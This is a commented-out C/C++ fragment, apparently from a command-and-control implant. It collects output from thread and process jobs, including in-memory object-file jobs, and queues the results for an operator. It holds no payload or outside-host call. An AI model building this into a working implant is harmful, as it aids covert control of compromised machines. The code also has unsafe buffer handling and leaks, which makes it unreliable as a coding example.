// #include "Coff.h"
// #include "Implant.h"
//
// // insert pivot task into implant task list
// static BOOL AppendTaskResult( json& TaskResult ) {
//     PTASK_INFO TaskInfo;
//
//     // Store task result
//     TaskInfo = (TASK_INFO*)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( TASK_INFO ) );
//     if (!TaskInfo) {
//         printf( "[-] Failed to allocate heap memory for TAKS_INFO\n" );
//         return FALSE;
//     }
//
//     TaskInfo->Data   = TaskResult;
//     TaskInfo->Status = 1;
//
//     InsertTailList( &g_Implant.TaskResponseList, &TaskInfo->ListEntry );
//
//     return TRUE;
// }
//
// BOOL ImplantGetJobsInfo() {
//     LIST_ENTRY* current = g_Implant.JobList.Flink;
//
//     while (current != &g_Implant.JobList) {
//         json  JobResult = json::object();
//         PJOB  Job       = CONTAINING_RECORD( current, JOB, ListEntry );
//         DWORD ExitCode  = 0;
//
//         if (Job->Type == JOB_TYPE_THREAD) {
//             GetExitCodeThread( Job->hThread, &ExitCode );
//             if (ExitCode != STILL_ACTIVE) {
//                 INT   OutputSize   = 0;
//                 PCHAR Output       = BeaconGetOutputData( &OutputSize );
//                 Output[OutputSize] = '\0';
//
//                 JobResult["job"]    = Job->ID;
//                 JobResult["output"] = Output;
//                 AppendTaskResult( JobResult );
//
//                 CloseHandle( Job->hThread );
//                 RemoveEntryList( &Job->ListEntry );
//                 HeapFree( GetProcessHeap(), 0, Job );
//                 free( Output );
//
//                 return TRUE;
//             }
//
//         } else if (Job->Type == JOB_TYPE_PROCESS) {
//             // check if job is done
//             GetExitCodeProcess( Job->hProcess, &ExitCode );
//             if (ExitCode == STILL_ACTIVE) {
//                 DWORD BytesToRead = 0;
//
//                 if (!PeekNamedPipe( Job->hAnonPipe, NULL, 0, NULL, &BytesToRead, 0 ) ||
//                     !BytesToRead) {
//                     if (GetLastError() == ERROR_BROKEN_PIPE) {
//                         printf( "unexpected process exit\n" );
//
//                         JobResult["job"]    = Job->ID;
//                         JobResult["output"] = "[-] job crashed";
//                         AppendTaskResult( JobResult );
//
//                         CloseHandle( Job->hProcess );
//                         CloseHandle( Job->hAnonPipe );
//                         RemoveEntryList( &Job->ListEntry );
//                         return TRUE;
//                     }
//
//                     goto NextNode;
//                 }
//
//                 CHAR* Output =
//                     (CHAR*)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, BytesToRead + 1 );
//                 if (!Output) {
//                     printf( "HeapAlloc failed: ( %d )\n", GetLastError() );
//                     goto NextNode;
//                 }
//
//                 if (!ReadFile( Job->hAnonPipe, Output, BytesToRead, NULL, NULL )) {
//                     printf( "ReadFile failed: ( %d )\n", GetLastError() );
//                     goto NextNode;
//                 }
//
//                 Output[BytesToRead] = '\0';
//
//                 JobResult["job"]    = Job->ID;
//                 JobResult["output"] = Output;
//                 AppendTaskResult( JobResult );
//
//                 HeapFree( GetProcessHeap(), 0, Output );
//                 return TRUE;
//             } else {
//                 // read all and mark job as done
//                 DWORD BytesToRead = 0;
//
//                 if (!PeekNamedPipe( Job->hAnonPipe, NULL, 0, NULL, &BytesToRead, NULL )) {
//                     if (GetLastError() == ERROR_BROKEN_PIPE) {
//                         printf( "process terminated but unexpected process exit\n" );
//
//                         JobResult["job"]    = Job->ID;
//                         JobResult["output"] = "[-] job crashed";
//                         AppendTaskResult( JobResult );
//
//                         CloseHandle( Job->hProcess );
//                         CloseHandle( Job->hAnonPipe );
//                         RemoveEntryList( &Job->ListEntry );
//                         HeapFree( GetProcessHeap(), 0, Job );
//
//                         return TRUE;
//                     }
//
//                     printf( "PeekNamedPipe failed: ( %d )\n", GetLastError() );
//                     return FALSE;
//                 }
//
//                 CHAR* Output =
//                     (CHAR*)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, BytesToRead + 1 );
//                 if (!Output) {
//                     printf( "HeapAlloc failed: ( %d )\n", GetLastError() );
//                     goto NextNode;
//                 }
//
//                 if (!ReadFile( Job->hAnonPipe, Output, BytesToRead, NULL, NULL )) {
//                     printf( "ReadFile failed: ( %d )\n", GetLastError() );
//                     goto NextNode;
//                 }
//
//                 Output[BytesToRead] = '\0';
//
//                 JobResult["job"]    = Job->ID;
//                 JobResult["output"] = Output;
//                 AppendTaskResult( JobResult );
//
//                 CloseHandle( Job->hProcess );
//                 CloseHandle( Job->hAnonPipe );
//                 RemoveEntryList( &Job->ListEntry );
//
//                 HeapFree( GetProcessHeap(), 0, Job );
//                 HeapFree( GetProcessHeap(), 0, Output );
//                 return TRUE;
//             }
//         }
//     NextNode:
//         current = current->Flink;
//     }
//
//     return FALSE;
// }
